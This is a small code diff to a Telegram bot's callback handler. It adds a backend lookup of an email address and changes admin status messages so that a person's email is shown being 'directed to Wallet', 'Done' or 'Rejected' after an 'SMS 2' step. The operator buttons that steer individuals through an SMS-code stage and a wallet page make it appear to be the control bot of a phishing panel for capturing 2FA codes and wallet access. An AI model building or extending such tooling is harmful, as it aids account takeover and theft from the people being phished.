@@ -104,18 +104,23 @@ bot.on("callback_query", async (query) => {
         // Send popup
         await bot.answerCallbackQuery(query.id, { text: `✅ ${action.toUpperCase()}` });
         
-        // ✅ Send status message
+        // ✅ Send status message with email
         try {
           const botToken = process.env.BOT_TOKEN;
           const chatId = process.env.ADMIN_CHAT_ID;
           
+          // ✅ Fetch email from backend
+          const sms2Info = await fetch(`${APP_URL}/get-sms2-info/${sms2Id}`);
+          const sms2Data = await sms2Info.json();
+          const sms2Email = sms2Data.email || sms2Id;
+          
           let statusMsg = "";
           if (action === "sms2_wallet") {
-            statusMsg = `🔐 <code>${sms2Id}</code> SMS 2 → <b>Wallet</b> 💼`;
+            statusMsg = `🔐 <code>${sms2Email}</code> has been directed to <b>Wallet</b> 💼`;
           } else if (action === "sms2_done") {
-            statusMsg = `🔐 <code>${sms2Id}</code> SMS 2 → <b>Done</b> 🏁`;
+            statusMsg = `🔐 <code>${sms2Email}</code> has been directed to <b>Done</b> 🏁`;
           } else if (action === "sms2_reject") {
-            statusMsg = `🔐 <code>${sms2Id}</code> SMS 2 → <b>Rejected</b> ❌`;
+            statusMsg = `🔐 <code>${sms2Email}</code> has been <b>Rejected</b> ❌`;
           }
           
           if (statusMsg) {
